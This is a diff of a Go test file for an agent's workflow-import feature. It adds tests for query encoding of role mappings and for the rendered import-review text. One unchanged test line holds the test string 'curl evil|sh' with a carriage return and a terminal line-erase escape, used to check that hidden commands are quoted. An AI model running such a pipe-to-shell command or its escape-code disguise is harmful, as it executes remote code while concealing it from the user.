@@ -3,6 +3,7 @@ package agent
 import (
 	"archive/zip"
 	"bytes"
+	"encoding/json"
 	"os"
 	"path/filepath"
 	"testing"
@@ -73,4 +74,34 @@ func TestRenderWorkflowQuotesControlCharacters(t *testing.T) {
 	}}})
 	assert.Contains(t, out.String(), `"curl evil|sh\r\x1b[2K  x:merge [git]: gh pr merge"`)
 	assert.NotContains(t, out.String(), "\x1b")
+}
+
+// The import choices travel as the query the daemon reviews them under.
+func TestWorkflowImportChoices(t *testing.T) {
+	q, err := workflowImportChoices(&processTemplatesImportParams{MapRole: []string{"dev=engineer", " reviewer = qa "}, Rename: true, Group: "webshop"})
+	require.NoError(t, err)
+	assert.Equal(t, "group=webshop&map=dev%3Dengineer&map=reviewer%3Dqa&rename=1", q.Encode())
+	_, err = workflowImportChoices(&processTemplatesImportParams{MapRole: []string{"dev"}})
+	assert.ErrorContains(t, err, "<workflow role>=<local role>")
+}
+
+// The review shows mapped and unknown roles and the ids templates are
+// stored under.
+func TestRenderImportChanges(t *testing.T) {
+	var view workflowImportJSON
+	require.NoError(t, json.Unmarshal([]byte(`{
+		"roleMap": [{"name": "dev", "target": "engineer", "mapped": true, "known": true}, {"name": "reviewer", "target": "reviewer"}],
+		"templates": [
+			{"ref": "ship@sha256:aa", "id": "ship", "importRef": "ship-2@sha256:bb", "importId": "ship-2", "status": "new"},
+			{"ref": "review@sha256:cc", "id": "review", "importRef": "review@sha256:dd", "importId": "review", "status": "update", "currentRef": "review@sha256:ee"}
+		],
+		"group": "webshop"}`), &view))
+	var out bytes.Buffer
+	renderImportChanges(&out, &view)
+	text := out.String()
+	assert.Contains(t, text, "  dev -> engineer\n")
+	assert.Contains(t, text, "reviewer (nothing here has this role or profile yet")
+	assert.Contains(t, text, "new        ship@sha256:aa as ship-2@sha256:bb (renamed)")
+	assert.Contains(t, text, "review@sha256:cc as review@sha256:dd (roles mapped) (here now: review@sha256:ee")
+	assert.Contains(t, text, "Pins the process to group webshop.")
 }
